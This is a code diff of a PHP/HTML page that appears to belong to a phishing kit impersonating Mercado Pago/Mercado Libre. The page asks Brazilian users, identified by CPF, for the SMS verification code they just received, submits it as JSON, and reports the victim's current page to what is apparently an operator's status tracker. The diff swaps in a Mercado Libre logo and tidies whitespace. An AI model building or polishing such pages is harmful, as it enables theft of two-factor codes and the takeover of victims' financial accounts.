@@ -21,7 +21,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Insira o código que te enviamos por SMS</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -210,7 +210,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             </div>
             <button type="submit" class="btn btn-primary">Confirmar código</button>
         </form>
-        
+
         <div class="resend-timer"></div>
         <a href="doisfatores2mobile.php" class="footer-link">Escolher outro método</a>
     </main>
@@ -241,12 +241,12 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         function startTimer() {
             let seconds = 50;
             timerElement.style.color = 'var(--cor-texto-secundaria)';
-            
+
             function updateTimer() {
                 const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                 const secs = String(seconds % 60).padStart(2, '0');
                 timerElement.innerHTML = `Reenviar código em ${minutes}:${secs}`;
-                
+
                 if (seconds > 0) {
                     seconds--;
                 } else {
@@ -254,7 +254,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                 }
             }
-            
+
             clearInterval(countdownInterval);
             updateTimer();
             countdownInterval = setInterval(updateTimer, 1000);
@@ -267,7 +267,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         }
 
         document.addEventListener('DOMContentLoaded', startTimer);
-        
+
         async function handleFormSubmit(event) {
             event.preventDefault();
             const code = inputs.map(input => input.value).join('');
@@ -279,9 +279,9 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ sms_code: code })
                     });
-                    
+
                     const result = await response.json();
-                    
+
                     if (result.success) {
                         alert('Código recebido com sucesso!');
                     } else {
@@ -325,7 +325,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
